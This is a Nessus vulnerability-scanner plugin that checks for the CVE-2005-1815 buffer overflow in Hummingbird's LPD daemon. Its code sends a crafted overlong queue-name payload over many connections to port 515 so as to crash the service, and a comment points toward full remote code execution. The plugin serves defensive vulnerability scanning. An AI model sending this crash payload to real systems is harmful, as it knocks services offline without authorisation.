#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(18403);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2005-1815");
  script_bugtraq_id(13788);
  script_osvdb_id(16956, 16957);

  script_name(english:"Hummingbird InetD LPD Component (Lpdw.exe) Data Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host contains an application that is affected by a buffer
overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The lpd daemon installed on the remote host appears to be from the
Hummingbird Connectivity suite and suffers from a buffer overflow
vulnerability.  An attacker can crash the daemon by sending commands
with overly-long queue names. Additionally, with a specially crafted packet,
the attacker can also execute code remotely within the context of the affected service.");

 script_set_attribute(attribute:"see_also", value:
 "http://www.nessus.org/u?bbff422b" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'Hummingbird Connectivity 10 SP5 LPD Buffer Overflow');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/05/30");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/05/18");
 script_cvs_date("$Date: 2014/05/21 20:41:40 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_summary(english:"Checks for buffer overflow vulnerability in Hummingbird lpd");
  script_category(ACT_DENIAL);
  script_family(english:"Gain a shell remotely");
  script_copyright(english:"This script is Copyright (C) 2005-2014 Tenable Network Security, Inc.");
  script_dependencie("find_service1.nasl");
  script_require_ports("Services/lpd", 515);
  script_require_keys("Settings/ParanoidReport");

  exit(0);
}


include("global_settings.inc");

if ( report_paranoia < 2 ) 
  exit(1, "This plugin only runs if 'Report paranoia' is set to 'Paranoid'.");

port = get_kb_item("Services/lpd");
if (!port) port = 515;
if (!get_tcp_port_state(port)) exit(1, "Port "+port+" is not open.");


# Try to crash the remote lpd. (A working buffer overflow exploit
# is left as an exercise for the reader. :-)
exploit = raw_string(1)+ crap(1500) + raw_string(0x0A);
# nb: 'max' must be > 3 + maximum number of servers configured 
#     on the remote (default is 4).
max = 15;
for (i=1; i<=max; ++i) {
  soc[i] = open_priv_sock_tcp(dport:port);

  if (soc[i]) {
    send(socket:soc[i], data:exploit);
  }
  else {
    # If the first 2 connection attempts failed, just exit.
    if (i == 2 && !soc[1] && !soc[2]) {
      exit(0);
    }
    # Otherwise, there's a problem if the previous 2 attempts failed as well.
    else if (i >= 2 && !soc[i-1] && !soc[i-2]) {
      security_warning(port);
      break;
    }
    # Maybe the daemon is just busy.
    sleep(1);
  }
}


# Close any open sockets.
for (i=1; i<=max; i++) {
  if (soc[i]) close(soc[i]);
}
